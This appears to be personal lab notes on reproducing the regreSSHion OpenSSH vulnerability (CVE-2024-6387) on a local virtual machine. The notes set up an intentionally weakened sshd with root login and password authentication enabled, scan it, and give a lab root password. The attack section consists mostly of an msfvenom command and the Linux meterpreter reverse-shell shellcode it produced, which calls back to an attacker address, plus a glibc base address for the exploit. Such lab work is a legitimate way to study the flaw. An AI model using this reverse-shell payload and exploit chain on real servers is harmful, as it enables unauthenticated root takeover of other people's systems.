CVE-2024-6387 (RegreSSHion)


This is a critical signal handler race condition vulnerability in OpenSSH servers (sshd) on glibc-based Linux systems. Disclosed on July 1, 2024, it allows unauthenticated remote code execution (RCE) with root privileges. The vulnerability affects OpenSSH versions 8.5p1 to 9.7p1.

A signal handler race condition was found in OpenSSH's server (sshd), where a client does not authenticate within LoginGraceTime seconds (120 by default, 600 in old OpenSSH versions), then sshd's SIGALRM handler is called asynchronously. However, this signal handler calls various functions that are not async-signal-safe, for example, syslog().



PoC: https://github.com/l0n3m4n/CVE-2024-6387 
* Description:
 * Targets a signal handler race condition in OpenSSH's
 * server (sshd) on glibc-based Linux systems. It exploits a vulnerability
 * where the SIGALRM handler calls async-signal-unsafe functions, leading
 * to rce as root.

Checker: https://github.com/xaitax/CVE-2024-6387_Check/blob/main/CVE-2024-6387_Check.py 




Victim setup:
https://launchpad.net/ubuntu/+source/openssh/1:9.3p1-1ubuntu3 - need this oppen SSH version

Ssh -V
-Needs to be under version 9.6

sudo nano /etc/ssh/sshd_config

Add these:
PermitRootLogin yes
PasswordAuthentication yes





â”€â”€(kaliã‰¿kali)-[~/today/CVE-2024-6387_Check]
â””â”€$ python3 CVE-2024-6387_Check.py 10.0.2.4


                                      _________ _________ ___ ___ .__               
_______   ____   ___________   ____  /   _____//   _____//   |   \|__| ____   ____  
\_  __ \_/ __ \ / ___\_  __ \_/ __ \ \_____  \ \_____  \/    ~    \  |/  _ \ /    \ 
 |  | \/\  ___// /_/  >  | \/\  ___/ /        \/        \    Y    /  (  <_> )   |  \
 |__|    \___  >___  /|__|    \___  >_______  /_______  /\___|_  /|__|\____/|___|  /
             \/_____/             \/        \/        \/       \/                \/ 
    CVE-2024-6387 Vulnerability Checker                                             
    v0.8 / Alex Hagenah / @xaitax / ah@primepage.de                                 
                                                                                    

Progress: 1/1 checks performed

ðŸ›¡ Servers not vulnerable: 0

ðŸš¨ Servers likely vulnerable: 1
   [+] Server at 10.0.2.4 (running SSH-2.0-OpenSSH_9.3)

âš  Servers with unknown SSH version: 0

ðŸ”’ Servers with port(s) closed: 0

ðŸ“Š Total scanned hosts: 1
ðŸ“Š Total port checks performed: 1






Installing openSSH vulnerable server:

https://chatgpt.com/g/g-679e751c9ff48191bf3b02d3dc06832d-htb/c/67a1615d-faf0-800e-a78e-169a01645ddd 


tar -xvzf openssh_9.3p1.orig.tar.gz
cd openssh-9.3p1

./configure --prefix=/usr --sysconfdir=/etc/ssh
-you may get an outdated zlib check, just add a flag to ignore it

make -j$(nproc)
sudo make install


Sudo systemctl start ssh
-if it doesnt start, use the command below to install openssh
 
sudo apt install openssh-server -y
-once this starts, make sure to keep current openssh version which is vulnerable

Since OpenSSH was compiled manually, the SSH service file is missing. Letâ€™s create it:
sudo nano /etc/systemd/system/ssh.service


[Unit]
Description=OpenSSH server daemon
After=network.target auditd.service

[Service]
ExecStart=/usr/sbin/sshd -D
ExecReload=/bin/kill -HUP $MAINPID
Restart=always
RestartSec=3
KillMode=process
Type=simple

[Install]
WantedBy=multi-user.target


sudo systemctl daemon-reload
sudo systemctl start ssh
sudo systemctl enable ssh
sudo systemctl status ssh


Nmap scan from Kali:
â””â”€$ nmap -sC -sV -p- --min-rate=1000 10.0.2.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-03 23:35 EST
Nmap scan report for 10.0.2.4
Host is up (0.0015s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3 (protocol 2.0)
| ssh-hostkey: 
|   256 5d:ca:2d:ba:93:a6:a7:cf:41:bb:48:e3:75:63:ed:77 (ECDSA)
|_  256 68:8c:15:af:4a:9a:7d:b2:5d:e1:77:0b:78:2e:b0:5f (ED25519)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.17 seconds

admin8989 is root password




Now on the attack process:


msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=9999 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of c file: 574 bytes
unsigned char buf[] = 
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x27\x0f\x0a\x00\x02\x0f\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";




uint64_t GLIBC_BASES[] = { 0x73f1be806000 };

